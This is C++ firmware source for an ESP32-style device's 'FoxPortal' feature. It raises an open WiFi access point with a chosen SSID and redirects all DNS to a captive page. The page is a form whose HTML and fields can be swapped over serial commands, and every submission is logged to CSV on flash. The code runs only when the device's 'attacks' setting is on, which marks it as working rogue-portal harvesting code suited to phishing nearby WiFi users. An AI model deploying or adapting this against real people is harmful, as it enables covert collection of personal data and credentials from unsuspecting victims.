#include "fox_portal.h"
#include "config.h"
#include "settings.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <string.h>

namespace {

DNSServer dnsServer;
WebServer webServer(80);
bool portalActive = false;

String currentSsid;
String currentDate;

String startHtml;
String thanksHtml;

String fields[FOX_PORTAL_MAX_FIELDS] = {"name", "phone"};
int fieldCount = 2;

String currentTitle = "Get In Touch";
String currentIntro = "Leave your details and we'll follow up shortly.";
String currentNote = "You're free to disconnect from this WiFi network now.";

const char* START_HTML_PATH = "/foxportal_start.html";
const char* THANKS_HTML_PATH = "/foxportal_thanks.html";
const char* FIELDS_CFG_PATH = "/foxportal_fields.cfg";
const char* TITLE_CFG_PATH = "/foxportal_title.txt";
const char* INTRO_CFG_PATH = "/foxportal_intro.txt";
const char* NOTE_CFG_PATH = "/foxportal_note.txt";

bool refuseIfDisabled() {
  if (!FoxSettings::attacksEnabled()) {
    Serial.println("ERROR:DISABLED");
    return true;
  }
  return false;
}

String loadPage(const char* path) {
  if (!LittleFS.exists(path)) return String("");
  File f = LittleFS.open(path, "r");
  if (!f) return String("");
  String content = f.readString();
  f.close();
  return content;
}

bool savePage(const char* path, const String& html) {
  File f = LittleFS.open(path, "w");
  if (!f) return false;
  f.print(html);
  f.close();
  return true;
}

void saveFieldsConfig() {
  String raw;
  raw.reserve(fieldCount * 12);
  for (int i = 0; i < fieldCount; i++) {
    raw += fields[i];
    raw += "\n";
  }
  savePage(FIELDS_CFG_PATH, raw);
}

void loadFieldsConfig() {
  String raw = loadPage(FIELDS_CFG_PATH);
  if (raw.length() == 0) return;

  String parsed[FOX_PORTAL_MAX_FIELDS];
  int count = 0;
  int start = 0;
  while (start <= (int)raw.length() && count < FOX_PORTAL_MAX_FIELDS) {
    int nl = raw.indexOf('\n', start);
    String line = (nl >= 0) ? raw.substring(start, nl) : raw.substring(start);
    line.trim();
    if (line.length() > 0) {
      parsed[count] = line;
      count++;
    }
    if (nl < 0) break;
    start = nl + 1;
  }

  if (count > 0) {
    for (int i = 0; i < count; i++) fields[i] = parsed[i];
    fieldCount = count;
  }
}

void loadTitleIntroNote() {
  String t = loadPage(TITLE_CFG_PATH);
  if (t.length() > 0) currentTitle = t;
  String in = loadPage(INTRO_CFG_PATH);
  if (in.length() > 0) currentIntro = in;
  String n = loadPage(NOTE_CFG_PATH);
  if (n.length() > 0) currentNote = n;
}

String htmlEscape(const String& in) {
  String out;
  out.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '&': out += "&amp;"; break;
      case '<': out += "&lt;"; break;
      case '>': out += "&gt;"; break;
      case '"': out += "&quot;"; break;
      case '\'': out += "&#39;"; break;
      default: out += c;
    }
  }
  return out;
}

String csvEscape(const String& in) {
  bool needsQuote = in.indexOf(',') >= 0 || in.indexOf('"') >= 0 || in.indexOf('\n') >= 0;
  if (!needsQuote) return in;
  String out = "\"";
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    if (c == '"') out += "\"\"";
    else out += c;
  }
  out += "\"";
  return out;
}

String buildDefaultStartHtml() {
  String html;
  html.reserve(900);
  html += "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
          "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<title>";
  html += htmlEscape(currentTitle);
  html += "</title><style>"
          "body{margin:0;background:#111;color:#eee;font-family:sans-serif;"
          "text-align:center;padding:40px 20px}"
          "h1{color:#FF6600;font-size:1.6em;margin-bottom:10px}"
          "p{font-size:0.95em;color:#ccc;margin-bottom:30px}"
          "input{width:100%;max-width:280px;padding:12px;margin:8px 0;"
          "border-radius:8px;border:none;font-size:1em;box-sizing:border-box}"
          "button{width:100%;max-width:280px;padding:12px;margin-top:10px;"
          "border-radius:8px;border:none;background:#FF6600;color:#111;"
          "font-weight:bold;font-size:1em}"
          "</style></head><body>"
          "<h1>";
  html += htmlEscape(currentTitle);
  html += "</h1><p>";
  html += htmlEscape(currentIntro);
  html += "</p><form method=\"POST\" action=\"/\">";
  for (int i = 0; i < fieldCount; i++) {
    html += "<input type=\"text\" name=\"";
    html += fields[i];
    html += "\" placeholder=\"";
    html += htmlEscape(fields[i]);
    html += "\">";
  }
  html += "<button type=\"submit\">Submit</button></form></body></html>";
  return html;
}

String buildDefaultThanksHtml(const String* values, int count) {
  String html;
  html.reserve(700);
  html += "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
          "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<title>Thank You</title><style>"
          "body{margin:0;background:#111;color:#eee;font-family:sans-serif;"
          "text-align:center;padding:40px 20px}"
          "h1{color:#FF6600;font-size:1.6em;margin-bottom:10px}"
          "p{font-size:0.95em;color:#ccc;margin:6px 0}"
          ".info{background:#1e1e1e;border-radius:8px;padding:16px;margin:20px auto;"
          "max-width:280px;text-align:left}"
          ".info b{color:#FF6600}"
          "</style></head><body>"
          "<h1>Thank You</h1><div class=\"info\">";
  for (int i = 0; i < count; i++) {
    html += "<p><b>";
    html += htmlEscape(fields[i]);
    html += ":</b> ";
    html += htmlEscape(values[i]);
    html += "</p>";
  }
  html += "</div><p>";
  html += htmlEscape(currentNote);
  html += "</p></body></html>";
  return html;
}

void logSubmission(const String* values, int count) {
  String path = "/foxportal_log_" + currentDate + ".csv";
  bool isNew = !LittleFS.exists(path);
  File f = LittleFS.open(path, "a");
  if (!f) return;
  if (isNew) {
    String header = "SSID";
    for (int i = 0; i < count; i++) {
      header += ",";
      header += fields[i];
    }
    f.println(header);
  }
  f.print(csvEscape(currentSsid));
  for (int i = 0; i < count; i++) {
    f.print(",");
    f.print(csvEscape(values[i]));
  }
  f.println();
  f.close();
}

void handleServe() {
  webServer.send(200, "text/html", startHtml.length() > 0 ? startHtml : buildDefaultStartHtml());
}

void handleSubmit() {
  String values[FOX_PORTAL_MAX_FIELDS];
  for (int i = 0; i < fieldCount; i++) {
    String v = webServer.hasArg(fields[i]) ? webServer.arg(fields[i]) : String("");
    v.trim();
    if ((int)v.length() > FOX_PORTAL_FIELD_MAX) v = v.substring(0, FOX_PORTAL_FIELD_MAX);
    values[i] = v;
  }

  logSubmission(values, fieldCount);

  String page;
  if (thanksHtml.length() > 0) {

    page = thanksHtml;
    for (int i = 0; i < fieldCount; i++) {
      String token = "{{FIELD:" + fields[i] + "}}";
      page.replace(token, htmlEscape(values[i]));
    }
  } else {
    page = buildDefaultThanksHtml(values, fieldCount);
  }
  webServer.send(200, "text/html", page);
}

bool parseFieldsCommand(const String& rest, String* out, int& outCount, String& errReason) {
  outCount = 0;
  int start = 0;
  while (start <= (int)rest.length()) {
    int comma = rest.indexOf(',', start);
    String name = (comma >= 0) ? rest.substring(start, comma) : rest.substring(start);
    name.trim();
    if (name.length() > 0) {
      for (size_t i = 0; i < name.length(); i++) {
        char c = name[i];
        bool ok = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                  (c >= '0' && c <= '9') || c == '_';
        if (!ok) {
          errReason = "INVALIDKEY";
          return false;
        }
      }
      if ((int)name.length() > FOX_PORTAL_KEY_MAX) name = name.substring(0, FOX_PORTAL_KEY_MAX);
      if (outCount >= FOX_PORTAL_MAX_FIELDS) {
        errReason = "TOOMANY";
        return false;
      }
      out[outCount] = name;
      outCount++;
    }
    if (comma < 0) break;
    start = comma + 1;
  }
  if (outCount == 0) {
    errReason = "INVALID";
    return false;
  }
  return true;
}

void startPortal(const String& ssid, const String& date) {
  currentSsid = ssid.length() > 0 ? ssid : String(FOX_PORTAL_DEFAULT_SSID);
  currentDate = date.length() > 0 ? date : String("unknown-date");

  LittleFS.begin(true);
  startHtml = loadPage(START_HTML_PATH);
  thanksHtml = loadPage(THANKS_HTML_PATH);
  loadFieldsConfig();
  loadTitleIntroNote();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(currentSsid.c_str());
  delay(200);

  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.onNotFound(handleServe);
  webServer.on("/", HTTP_GET, handleServe);
  webServer.on("/", HTTP_POST, handleSubmit);
  webServer.begin();

  portalActive = true;
  Serial.print("FOXPORTAL:STARTED:");
  Serial.println(currentSsid);
}

void stopPortal() {
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  portalActive = false;
  Serial.println("FOXPORTAL:STOPPED");
}

}

namespace FoxPortal {

void loop() {
  if (!portalActive) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
}

bool handleCommand(const String& line) {
  if (line.startsWith("WIFIFOXPORTAL:START")) {
    if (refuseIfDisabled()) return true;
    String rest = line.substring(strlen("WIFIFOXPORTAL:START"));
    String ssid, date;
    if (rest.startsWith(":")) {
      rest = rest.substring(1);
      int c = rest.indexOf(':');
      if (c >= 0) {
        ssid = rest.substring(0, c);
        date = rest.substring(c + 1);
      } else {
        ssid = rest;
      }
    }
    startPortal(ssid, date);
    return true;
  }

  if (line == "WIFIFOXPORTAL:STOP") {
    stopPortal();
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:FIELDS:")) {
    String rest = line.substring(strlen("WIFIFOXPORTAL:FIELDS:"));
    String parsed[FOX_PORTAL_MAX_FIELDS];
    int parsedCount = 0;
    String err;
    if (!parseFieldsCommand(rest, parsed, parsedCount, err)) {
      Serial.print("ERROR:");
      Serial.println(err);
      return true;
    }
    for (int i = 0; i < parsedCount; i++) fields[i] = parsed[i];
    fieldCount = parsedCount;
    LittleFS.begin(true);
    saveFieldsConfig();
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETTITLE:")) {
    String text = line.substring(strlen("WIFIFOXPORTAL:SETTITLE:"));
    if ((int)text.length() > FOX_PORTAL_TITLE_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(TITLE_CFG_PATH, text)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    currentTitle = text;
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETINTRO:")) {
    String text = line.substring(strlen("WIFIFOXPORTAL:SETINTRO:"));
    if ((int)text.length() > FOX_PORTAL_INTRO_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(INTRO_CFG_PATH, text)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    currentIntro = text;
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETNOTE:")) {
    String text = line.substring(strlen("WIFIFOXPORTAL:SETNOTE:"));
    if ((int)text.length() > FOX_PORTAL_NOTE_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(NOTE_CFG_PATH, text)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    currentNote = text;
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETPAGE:START:")) {
    String html = line.substring(strlen("WIFIFOXPORTAL:SETPAGE:START:"));
    if ((int)html.length() > FOX_PORTAL_HTML_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(START_HTML_PATH, html)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    startHtml = html;
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETPAGE:THANKS:")) {
    String html = line.substring(strlen("WIFIFOXPORTAL:SETPAGE:THANKS:"));
    if ((int)html.length() > FOX_PORTAL_HTML_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(THANKS_HTML_PATH, html)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    thanksHtml = html;
    Serial.println("OK");
    return true;
  }

  if (line == "WIFIFOXPORTAL:QR") {
    if (currentSsid.length() == 0) {
      Serial.println("ERROR:NOTSTARTED");
      return true;
    }
    Serial.print("[WIFI/QR/SUCCESS]WIFI:T:nopass;S:");
    Serial.print(currentSsid);
    Serial.println(";;");
    return true;
  }

  return false;
}

}
